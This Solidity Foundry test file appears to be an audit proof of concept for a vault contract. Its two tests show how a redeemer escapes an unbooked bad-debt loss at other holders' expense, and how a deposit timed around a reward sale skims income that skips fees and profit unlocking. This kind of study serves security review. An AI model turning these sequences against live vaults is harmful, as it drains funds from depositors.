// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {SluiceFixture} from "./SluiceFixture.sol";

/// Copy into the audited project's test/ folder and run: forge test --match-contract ProofTest
contract ProofTest is SluiceFixture {
    /// Known vulnerability 1: the vault prices shares from each strategy's booked value, while a
    /// withdrawal takes live assets out of the market and lowers the booked value one for one. After a
    /// market writes off bad debt and before the next harvest, the first holder out is paid in full and
    /// the whole loss lands on the holders who stay.
    function test_unbookedLossEscapesToStayers() public {
        uint256 aliceShares = _deposit(alice, 500_000e6);
        uint256 bobShares = _deposit(bob, 500_000e6);
        vm.prank(allocator);
        vault.allocate(strategyA, 1_000_000e6);
        vm.prank(allocator);
        vault.harvest(strategyA);

        marketA.borrow(400_000e6);
        marketA.writeOff(100_000e6); // the market loses 100,000 of the vault's 1,000,000
        assertApproxEqAbs(strategyA.totalAssets(), 900_000e6, 1);
        assertEq(vault.totalAssets(), 1_000_000e6, "share price still at the booked value");

        vm.prank(alice);
        uint256 aliceOut = vault.redeem(aliceShares, alice, alice);
        assertApproxEqAbs(aliceOut, 500_000e6, 1, "alice leaves with no part of the loss");

        vm.prank(allocator);
        vault.harvest(strategyA);
        uint256 bobValue = vault.previewRedeem(bobShares);
        // Fair split of the loss: 450,000 each. Bob carries all of it.
        assertApproxEqAbs(bobValue, 400_000e6, 2, "bob is left with 400,000");
    }

    /// Known vulnerability 2: harvest charges the performance fee and unlocks profit over two days,
    /// but sold rewards land in the vault's idle balance, which totalAssets counts at once. The
    /// treasury gets no fee on reward income, and a deposit placed just before `sellRewards` and
    /// redeemed just after takes a share of income the existing holders earned.
    function test_soldRewardsSkipFeeAndUnlock() public {
        _deposit(alice, 1_000_000e6);
        vm.prank(allocator);
        vault.allocate(strategyB, 1_000_000e6);
        rewards.setOwed(address(strategyB), address(rewardToken), 10_000e18); // worth 20,000 USDC

        uint256 bobShares = _deposit(bob, 1_000_000e6); // lands just before the allocator's sale
        uint256 before = vault.totalAssets();
        vm.prank(allocator);
        vault.sellRewards(strategyB, address(rewardToken), 20_000e6);

        assertEq(vault.totalAssets(), before + 20_000e6, "all 20,000 reaches the share price at once");
        assertEq(vault.accruedFees(), 0, "no fee on 20,000 of income");
        assertEq(vault.unlockingProfit(), 0, "nothing unlocking");

        vm.prank(bob);
        uint256 bobOut = vault.redeem(bobShares, bob, bob);
        assertGt(bobOut, 1_009_999e6, "bob takes half the rewards in one block");
    }
}
